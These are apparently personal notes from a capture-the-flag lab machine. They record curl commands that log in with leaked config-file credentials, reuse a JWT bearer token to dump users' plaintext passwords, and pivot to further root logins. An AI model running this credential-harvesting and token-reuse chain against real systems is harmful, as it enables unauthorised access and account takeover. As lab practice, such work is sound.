10.10.10.137/config.php >> root:Zk6heYCyv6ZE9Xcg

curl -H "Content-Type: application/json" \
  -X POST \
  -d '{"password":"Zk6heYCyv6ZE9Xcg", "username":"admin"}' \
  http://10.10.10.137:8000/login

curl -X GET \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY2NjM5NjEwLCJleHAiOjE1NjY3MjYwMTB9.Cqn4nFfhRI1oh3eFpo1_diTRC872qn-791U8L_HM424' \
  http://10.10.10.137:3000/users/##GET EACH NAME SEPARATELY

{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
{"name":"Yuri","password":"bet@tester87"}
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}

Derry|rZ86wwLvx7jUxtch >> LOGIN in http://10.10.10.137/management/
http://10.10.10.137/management/config.json >> root:KpMasng6S5EtTy9Z

LOGIN IN : 10.10.10.137:8000 with (root:KpMasng6S5EtTy9Z)
